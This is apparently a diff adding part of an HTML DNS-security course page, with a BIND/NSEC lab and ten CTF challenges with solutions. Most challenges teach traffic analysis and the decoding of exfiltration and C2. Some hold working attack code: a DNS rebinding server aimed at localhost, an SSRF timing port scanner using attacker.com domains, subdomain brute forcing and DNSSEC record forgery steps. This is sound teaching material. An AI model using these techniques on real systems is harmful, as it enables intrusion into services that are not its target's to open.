+queries = [p for p in pkts if p.haslayer(DNS) and p[DNS].qr == 0]
+responses = [p for p in pkts if p.haslayer(DNS) and p[DNS].qr == 1]
+
+total_q = sum(len(p) for p in queries)
+total_r = sum(len(p) for p in responses)
+print(f"Query traffic:    {total_q} bytes ({len(queries)} packets)")
+print(f"Response traffic: {total_r} bytes ({len(responses)} packets)")
+print(f"Amplification:    {total_r/total_q:.1f}x")
+
+# Identify the spoofed victim (destination of all responses)
+from collections import Counter
+victims = Counter(p[IP].dst for p in responses)
+print(f"Target victim:    {victims.most_common(1)[0]}")</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 12 -->
+        <div class="lab-card">
+          <h4>Lab 12: NSEC Walking &amp; Zone File Creation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Enumerate DNSSEC-signed zones using NSEC walking, and create your own zone file with BIND.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># NSEC walking — enumerate all names in a DNSSEC zone
+# NSEC records reveal the "next" name in the zone
+ldns-walk example.com
+# Or with nsec3walker
+./nsec3walker --zone example.com
+
+# Manual NSEC walk
+NEXT="example.com"
+while true; do
+  RESULT=$(dig +dnssec NSEC $NEXT @ns1.example.com +short)
+  echo "$RESULT"
+  NEXT=$(echo "$RESULT" | awk '{print $1}')
+  [ "$NEXT" = "example.com." ] && break
+done</code></pre>
+<pre><code class="language-bash"># Create a BIND zone file
+cat &lt;&lt; 'EOF' > /etc/bind/db.lab.local
+$TTL    86400
+@       IN      SOA     ns1.lab.local. admin.lab.local. (
+                        2024010101  ; serial
+                        3600        ; refresh
+                        1800        ; retry
+                        604800      ; expire
+                        86400 )     ; negative TTL
+
+        IN      NS      ns1.lab.local.
+        IN      A       10.0.0.1
+ns1     IN      A       10.0.0.1
+www     IN      A       10.0.0.2
+mail    IN      A       10.0.0.3
+        IN      MX 10   mail.lab.local.
+dev     IN      CNAME   www.lab.local.
+_http._tcp IN   SRV 0 5 80 www.lab.local.
+EOF
+
+# Add zone to named.conf
+echo 'zone "lab.local" { type master; file "/etc/bind/db.lab.local"; };' >> /etc/bind/named.conf.local
+sudo systemctl restart bind9
+dig @localhost lab.local ANY</code></pre>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- ==================== CTF TAB ==================== -->
+      <div class="tab-content" id="ctf">
+
+        <!-- Challenge 1 -->
+        <div class="ctf-card">
+          <h4>Challenge 1: Hidden in the Records</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A flag has been hidden in the DNS TXT records of <code>ctf.challenge.com</code>. Query the right records to find it.</p>
+
+          <h5>Approach</h5>
+          <ul>
+            <li>Enumerate all TXT records for the domain and its subdomains</li>
+            <li>Flags can be split across multiple TXT records or encoded in base64</li>
+            <li>Check common subdomains: <code>_flag</code>, <code>flag</code>, <code>secret</code></li>
+          </ul>
+
+          <h5>Solution</h5>
+<pre><code class="language-bash"># Query TXT records for the main domain
+dig TXT ctf.challenge.com +short
+
+# Check common subdomains for hidden TXT records
+dig TXT flag.ctf.challenge.com +short
+dig TXT _flag.ctf.challenge.com +short
+dig TXT secret.ctf.challenge.com +short
+
+# If the flag is base64 encoded in a TXT record:
+dig TXT ctf.challenge.com +short | tr -d '"' | base64 -d
+
+# Brute force subdomains looking for TXT records
+for sub in flag secret hidden key admin _flag _secret; do
+  result=$(dig +short TXT "$sub.ctf.challenge.com" 2>/dev/null)
+  if [ -n "$result" ]; then
+    echo "[+] $sub.ctf.challenge.com TXT: $result"
+  fi
+done</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Try querying <code>_flag.ctf.challenge.com</code> for TXT records. The value may be base64 encoded — decode it with <code>echo "value" | base64 -d</code>.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 2 -->
+        <div class="ctf-card">
+          <h4>Challenge 2: Subdomain Hunter</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A hidden admin panel is running on a subdomain of <code>ctf.challenge.com</code>. Brute force the subdomains to find the service, then grab the flag from the HTTP response.</p>
+
+          <h5>Approach</h5>
+          <ul>
+            <li>Use DNS brute forcing to discover valid subdomains</li>
+            <li>Once found, make an HTTP request to the discovered subdomain</li>
+            <li>The flag is in the response body or headers</li>
+          </ul>
+
+          <h5>Solution</h5>
+<pre><code class="language-bash"># Brute force with gobuster
+gobuster dns -d ctf.challenge.com \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -t 50
+
+# Or with ffuf (virtual host brute force)
+ffuf -u http://ctf.challenge.com \
+  -H "Host: FUZZ.ctf.challenge.com" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -fc 301,302,404
+
+# Once you find the subdomain (e.g., s3cretadmin):
+curl -s http://s3cretadmin.ctf.challenge.com | grep -i flag</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+"""DNS subdomain brute forcer"""
+import dns.resolver
+import sys
+
+domain = "ctf.challenge.com"
+wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+
+resolver = dns.resolver.Resolver()
+resolver.timeout = 2
+resolver.lifetime = 2
+
+with open(wordlist) as f:
+    for line in f:
+        sub = line.strip()
+        fqdn = f"{sub}.{domain}"
+        try:
+            answers = resolver.resolve(fqdn, "A")
+            for rdata in answers:
+                print(f"[+] {fqdn} → {rdata}")
+        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
+                dns.resolver.NoNameservers, dns.exception.Timeout):
+            pass</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> The subdomain isn't in the top 100 most common names, but it is in the top 5000. Filter your ffuf/gobuster output for responses with a different content length than the default. The flag is in an HTTP response header called <code>X-Flag</code>.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 3 -->
+        <div class="ctf-card">
+          <h4>Challenge 3: Exfil Decoder</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">You've captured a pcap of DNS traffic from a compromised host. The attacker exfiltrated a file using DNS queries. Decode the exfiltrated data from the captured DNS queries to recover the flag.</p>
+
+          <h5>Approach</h5>
+          <ul>
+            <li>Extract DNS queries from the pcap — look for queries to the attacker's domain</li>
+            <li>The data is encoded in the subdomain labels (hex or base64)</li>
+            <li>Reassemble the chunks in order, decode, and recover the original file</li>
+          </ul>
+
+          <h5>Solution</h5>
+<pre><code class="language-bash"># Extract DNS queries from pcap with tshark
+tshark -r exfil.pcap -Y "dns.qr == 0" -T fields -e dns.qry.name | \
+  grep "\.exfil\.attacker\.com" | sort -u > queries.txt
+
+# Preview the extracted queries
+head queries.txt
+# Example output:
+# 0.48656c6c6f.exfil.attacker.com
+# 1.576f726c64.exfil.attacker.com
+# 2.466c6167.exfil.attacker.com</code></pre>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+"""Decode DNS exfiltration from extracted queries"""
+import sys
+
+queries_file = "queries.txt"
+exfil_domain = ".exfil.attacker.com"
+
+chunks = {}
+
+with open(queries_file) as f:
+    for line in f:
+        line = line.strip()
+        # Remove the exfil domain suffix
+        subdomain = line.replace(exfil_domain, "")
+        parts = subdomain.split(".")
+
+        # Format: sequence_number.hex_encoded_data
+        if len(parts) >= 2:
+            try:
+                seq = int(parts[0])
+                data = parts[1]
+                chunks[seq] = data
+            except ValueError:
+                continue
+
+# Reassemble in order
+ordered = [chunks[k] for k in sorted(chunks.keys())]
+hex_data = "".join(ordered)
+
+# Decode from hex
+try:
+    plaintext = bytes.fromhex(hex_data).decode("utf-8", errors="replace")
+    print(f"[+] Decoded data:\n{plaintext}")
+except ValueError:
+    # Try base64 instead
+    import base64
+    plaintext = base64.b64decode(hex_data).decode("utf-8", errors="replace")
+    print(f"[+] Decoded (base64):\n{plaintext}")</code></pre>
+
+<pre><code class="language-bash"># Alternative: one-liner with tshark + python
+tshark -r exfil.pcap -Y "dns.qr == 0 and dns.qry.name contains exfil" \
+  -T fields -e dns.qry.name | \
+  sed "s/\.exfil\.attacker\.com//" | \
+  sort -t. -k1 -n | \
+  cut -d. -f2 | \
+  tr -d '\n' | \
+  python3 -c "import sys; print(bytes.fromhex(sys.stdin.read()).decode())"</code></pre>
+
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> The first label in each subdomain is the sequence number (for reassembly order). The second label is hex-encoded data. Filter tshark output for queries only (<code>dns.qr == 0</code>), strip the exfil domain, sort by sequence number, concatenate the hex chunks, and decode with <code>bytes.fromhex()</code>.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 4 -->
+        <div class="ctf-card">
+          <h4>Challenge 4: DNS Rebinding Race</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A web app on the target fetches a URL you provide but validates the hostname resolves to a public IP. Use DNS rebinding to make it fetch <code>http://127.0.0.1:8080/admin/flag</code>. Your controlled DNS server is at <code>ns.attacker.com</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># Setup: DNS server that returns external IP first, then 127.0.0.1
+from scapy.all import *
+import time
+
+flip = {}
+
+def handle_dns(pkt):
+    if pkt.haslayer(DNSQR):
+        qname = pkt[DNSQR].qname.decode()
+        if "rebind.attacker.com" in qname:
+            count = flip.get(qname, 0)
+            ip = "ATTACKER_IP" if count == 0 else "127.0.0.1"
+            flip[qname] = count + 1
+            resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/ \
+                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                       an=DNSRR(rrname=qname, rdata=ip, ttl=0))
+            send(resp, verbose=0)
+
+sniff(filter="udp port 53", prn=handle_dns)
+
+# Submit to target: http://rebind.attacker.com/fetch?url=http://rebind.attacker.com:8080/admin/flag</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The app resolves the hostname twice: once for validation, once for fetching. Set TTL=0 so the second resolution gets 127.0.0.1. The app's validation check passes (public IP) but the actual fetch hits localhost.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 5 -->
+        <div class="ctf-card">
+          <h4>Challenge 5: Wildcard Zone Secrets</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A domain uses wildcard DNS (<code>*.ctf.challenge.com</code> → same IP). However, one specific subdomain has a different A record pointing to a hidden server. Find it and retrieve the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Everything resolves — wildcard catches all
+dig random123.ctf.challenge.com +short   # → 10.0.0.1 (wildcard)
+
+# Need to find the ONE subdomain with a different IP
+# Use a wordlist and filter for IPs that differ from the wildcard
+WILDCARD=$(dig +short random.ctf.challenge.com)
+while read sub; do
+  IP=$(dig +short "$sub.ctf.challenge.com" 2>/dev/null)
+  if [ -n "$IP" ] && [ "$IP" != "$WILDCARD" ]; then
+    echo "[+] $sub.ctf.challenge.com → $IP (DIFFERENT!)"
+  fi
+done < /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Once found:
+curl http://SECRET_SUB.ctf.challenge.com/flag</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>First determine the wildcard IP by querying a random subdomain. Then brute-force subdomains and compare each result against the wildcard IP. The non-wildcard subdomain has a name related to "secret" or "hidden". Use <code>ffuf</code> with <code>-fs</code> to filter by response size for the HTTP part.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 6 -->
+        <div class="ctf-card">
+          <h4>Challenge 6: DNSSEC Key Recovery</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A DNSSEC-signed zone has a weak ZSK (Zone Signing Key). The private key was generated with a known-bad PRNG. Recover the ZSK private key, forge a signed DNS record pointing <code>flag.challenge.com</code> to your IP, and serve the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Step 1: Extract the DNSKEY
+dig DNSKEY challenge.com +short
+# Get the ZSK (flag 256) vs KSK (flag 257)
+
+dig DNSKEY challenge.com +short | grep "^256"
+
+# Step 2: Extract and analyze the public key
+dig DNSKEY challenge.com +multi
+
+# Step 3: If RSA with small key (512-bit), factor it
+# Extract modulus from the DNSKEY RDATA
+python3 -c "
+import base64, struct
+# Parse DNSKEY RDATA (flags, proto, algo, pubkey)
+rdata = base64.b64decode('DNSKEY_BASE64_HERE')
+# RSA public key: exponent length + exponent + modulus
+print(f'Modulus (hex): {rdata[4:].hex()}')
+"
+# Factor with msieve, yafu, or factordb.com</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The ZSK uses RSA with a 512-bit modulus — small enough to factor. Extract the modulus from the DNSKEY record, factor it (try factordb.com), reconstruct the private key, and use <code>dnssec-signzone</code> to create a forged signed response.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 7 -->
+        <div class="ctf-card">
+          <h4>Challenge 7: DNS Service Discovery</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A network uses DNS-SD (Service Discovery) to advertise internal services. Query the SRV and TXT records to find a hidden management interface with credentials in the TXT record.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Discover advertised services
+dig SRV _services._dns-sd._udp.challenge.local +short
+
+# Enumerate specific service types
+dig SRV _http._tcp.challenge.local +short
+dig SRV _ssh._tcp.challenge.local +short
+dig SRV _admin._tcp.challenge.local +short
+
+# TXT records often contain metadata/credentials
+dig TXT _http._tcp.challenge.local +short
+dig TXT _admin._tcp.challenge.local +short
+
+# Browse all mDNS services
+avahi-browse -a -t -r</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Query <code>_admin._tcp.challenge.local SRV</code> to find the port, then check the TXT record for the same name — it contains <code>user=admin</code> and <code>pass=FLAG{...}</code>.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 8 -->
+        <div class="ctf-card">
+          <h4>Challenge 8: Cache Poisoning Detector</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A pcap captures a DNS cache poisoning attack in progress. Identify the attacker's spoofed response among hundreds of legitimate ones. Report the fake IP injected and the TXID used.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+from collections import defaultdict
+
+pkts = rdpcap("cache_poison.pcap")
+
+# Map queries to responses by TXID
+queries = {}
+for p in pkts:
+    if p.haslayer(DNS):
+        txid = p[DNS].id
+        if p[DNS].qr == 0:  # query
+            queries[txid] = p
+        elif p[DNS].qr == 1:  # response
+            if txid in queries:
+                # Check if response came from expected server
+                expected_src = queries[txid][IP].dst
+                actual_src = p[IP].src
+                if actual_src != expected_src:
+                    print(f"[!] POISONED: TXID={txid} from {actual_src} "
+                          f"(expected {expected_src})")
+                    print(f"    Injected: {p[DNS].an.rdata}")
+
+# Flag: FLAG{fake_ip_txid}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Compare the source IP of each DNS response with the destination IP of its matching query (by TXID). The poisoned response comes from a different IP. Also check for multiple responses with the same TXID — the second one is the attacker's.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 9 -->
+        <div class="ctf-card">
+          <h4>Challenge 9: Custom Protocol over DNS</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A C2 server communicates via DNS TXT queries/responses. The pcap contains command-and-control traffic. Decode the commands sent and responses received to find the exfiltrated flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+import base64
+
+pkts = rdpcap("c2_dns.pcap")
+
+for p in pkts:
+    if p.haslayer(DNS) and p.haslayer(DNSQR):
+        qname = p[DNSQR].qname.decode()
+        if ".c2.attacker.com" in qname:
+            if p[DNS].qr == 0:
+                # Commands encoded in subdomain
+                encoded = qname.split(".c2.attacker.com")[0].replace(".", "")
+                try:
+                    cmd = base64.b32decode(encoded.upper() + "=" * (-len(encoded) % 8))
+                    print(f"[CMD] {cmd.decode()}")
+                except:
+                    pass
+            elif p[DNS].qr == 1 and p[DNS].ancount > 0:
+                # Responses in TXT records
+                for i in range(p[DNS].ancount):
+                    rr = p[DNS].an[i] if p[DNS].ancount == 1 else p[DNS].an
+                    if hasattr(rr, 'rdata'):
+                        try:
+                            data = base64.b64decode(rr.rdata[0])
+                            print(f"[RSP] {data.decode()}")
+                        except:
+                            pass</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Commands go in base32-encoded subdomain labels (queries). Responses come back in base64-encoded TXT record data. Decode both sides to reconstruct the C2 session. The flag appears in one of the TXT responses after a "cat /flag.txt" command.</p>
+          </div>
+        </div>
+
+        <!-- Challenge 10 -->
+        <div class="ctf-card">
+          <h4>Challenge 10: DNS-based Port Scanner</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You can only reach the target through a web app that performs DNS lookups on user input. Exploit DNS to scan internal ports: the app leaks timing info based on whether the resolved IP:port is open or closed. Identify the 3 open ports to get the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python">import requests
+import time
+
+target_app = "http://challenge.ctf.com/lookup"
+
+# The app resolves a domain and tries to connect to port 80
+# We control DNS, so we point our domain at 127.0.0.1
+# The response time reveals if the internal port is open
+
+results = {}
+for port in [21, 22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443]:
+    # Our DNS returns 127.0.0.1 — app connects to 127.0.0.1:port
+    start = time.time()
+    r = requests.get(target_app, params={
+        "host": f"port{port}.scan.attacker.com",
+        "port": port
+    })
+    elapsed = time.time() - start
+    results[port] = elapsed
+    status = "OPEN" if elapsed < 1 else "CLOSED/FILTERED"
+    print(f"Port {port}: {elapsed:.2f}s → {status}")
+
+# Flag: FLAG{port1_port2_port3}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Open ports respond quickly (connection succeeds or gets a banner). Closed ports return RST immediately. Filtered ports time out. Compare response times — open ports have the shortest round-trip. The three open ports are common web/database services.</p>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+</body>
+</html>
